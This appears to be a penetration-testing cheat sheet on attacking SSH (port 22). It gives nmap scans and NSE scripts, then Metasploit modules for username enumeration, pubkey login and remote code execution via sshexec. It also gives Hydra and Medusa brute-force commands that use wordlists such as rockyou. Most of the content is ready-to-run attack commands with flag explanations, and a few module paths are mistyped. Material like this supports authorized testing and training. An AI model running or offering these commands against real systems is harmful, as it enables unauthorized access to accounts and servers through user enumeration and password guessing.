# SSH ENUM  PORT -22
----------------------------------------------------------------------------------------------------------------------------------------------------

• SSH stands for secure socket shell or secure shell. Commonly used port number is 22.

• It is a network protocol. That gives users a secure way to access a computer over the unsecure or open network.

## SSH Port Scanning
```
nmap -v -p 22 <IP>
```
PORT STATE SERVICE           
22/tcp open ssh

-v: Increase verbosity level (use -vv or more for greater effect)

-p <port ranges>: Only scan specified ports
Ex: -p22; -p1-65535; 

## SSH Version Scanning
```
nmap -v -sT -sV -p 22 192.168.56.105 
```
PORT   STATE SERVICE VERSION           
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
           
-v: Increase verbosity level (use -vv or more for greater effect)
           
-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
           
-sV: Probe open ports to determine service/version info
           
-p <port ranges>: Only scan specific portsEx: -p22; -p1-65535; 
           
### Scripts to enumerate SSH
```
cd /usr/share/nmap/scripts
```
```
ls | grep ssh
```
ssh2-enum-algos.nse
           
ssh-auth-methods.nse
           
ssh-brute.nse
           
ssh-hostkey.nse
           
ssh-publickey-acceptance.nse
           
ssh-run.nse
           
sshv1.nse
           

SSH Scanning by using predefined script 

The script for this is called ssh2-enum-algos and run against an OpenSSH server.
```
nmap -p22 -n -sV --script ssh2-enum-algos <IP>
```
# Exploit SSH with Metasploit

## Enumeration of users by Metasploit Framework

Metasploit Framework is preinstalled on Kali Linux. You can run framework by using below command:

### msfconsole
You can search different auxiliary and exploit modules by using the “search” operator. After identifying, you can use the “use” operator to run those modules against the target
search ssh_enumusers
          This module uses a malformed packet or timing attack to enumerate users on an OpenSSH server

```
msfconsole
```
```
msf6 > use auxiliary/scanner/ssh/ssh_enumusers
```
```
msf6 auxiliary(scanner/ssh/ssh_enumusers) > show options
```
```
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOST 192.168.56.105
```           
RHOST => 192.168.56.105
```
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/metasploit/namelist.txt
```
USER_FILE => /usr/share/wordlists/metasploit/namelist.txt
```
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set THREADS 25
```
THREADS => 25
```
msf6 auxiliary(scanner/ssh/ssh_enumusers) > show actions
```
```
msf6 auxiliary(scanner/ssh/ssh_enumusers) > exploit
```

### SSH login using pubkey
```           
use auxillary/scanner/ssh /ssh_login_pubkey
```
```
auxiliary (scanner/ssh /ssh_login_pubkey)>set rhosts
```
```          
auxiliary (scanner/ssh /ssh_login_pubkey)>set username ignite
```
```
auxiliary (scanner/ssh /ssh_login_pubkey)>set key_path /root/.ssh/id_rsa
```
```
auxiliary (scanner/ssh /ssh_login_pubkey)>exploit
```
### SSH User Code Execution
```
msf > use exploit/multi/ssh/sshexec
```
```
msf exploit(sshexec) >set rhosts
```
```
msf exploit(sshexec) >set username ignite
```
```
msf exploit(sshexec) >set password 123
```
```
msf exploit(sshexec) >set srvhost
```
```
msf exploit(sshexec) >exploit
```
# Bruteforce username and password
If the ssh port is open, we can try to bruteforce username and password.

There are various tools for brute force SSH 

## Hydra 
Hydra is a parallelized network login cracker built in various operating systems like Kali Linux, Parrot and other major penetration testing environments. ... Hydra is commonly used by penetration testers together with a set of programmes like crunch, cupp etc, which are used to generate wordlists

```           
hydra -l root -P /opt/password.txt (ip) ssh -t 4
```
```
hydra -L /opt/username.txt -P /opt/password.txt (ip) ssh -t 4
```
```
hydra -vV -L /opt/username.txt -P /opt/password.txt (ip) ssh -t 4
```
hydra -L logins.txt -P pws.txt -M targets.txt ssh
Hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://IP
           
-l LOGIN -L FILE login with LOGIN name, or load several logins from FILE
           
-p PASS or -P FILE try password PASS, or load several passwords from FILE
           
-t TASKS run TASKS number of connected in parallel per target (default: 16)
           
-v / -V / -d verbose mode / show login+pass for each attempt / debug mode
           
## Medusa 
Medusa is a modular, speedy, and parallel, login brute-forcer. It is a very powerful and lightweight tool. Medusa tool is used to brute-force credentials in as many protocols as possible which eventually lead to remote code execution.
```
medusa -u root -p /opt/password.txt -h <IP> -M ssh
```
```
medusa -u root -P /opt/password.txt -h <ip> ssh -t 4 
``` 
```
medusa -u <USERNAME> -P  /user/share/wordlists/rockyou.txt  -M ssh -h <IP>
```
```
medusa -U  /user/share/wordlists/rockyou.txt -p mickey  -M ssh -h <IP>
```
-M [TEXT] : Name of the module to execute (without the .mod extension)
           
-h [TEXT] : Target hostname or IP address
           
-U [FILE] : File containing usernames to test
           
-P [FILE] : File containing passwords to test
           
-t [NUM] : Total number of logins to be tested concurrently

#### Reference : 
https://github.com/vanhauser-thc/thc-hydra 
           
https://en.kali.tools/all/?tool=1343
           
https://github.com/nccgroup/ssh_user_enum
           




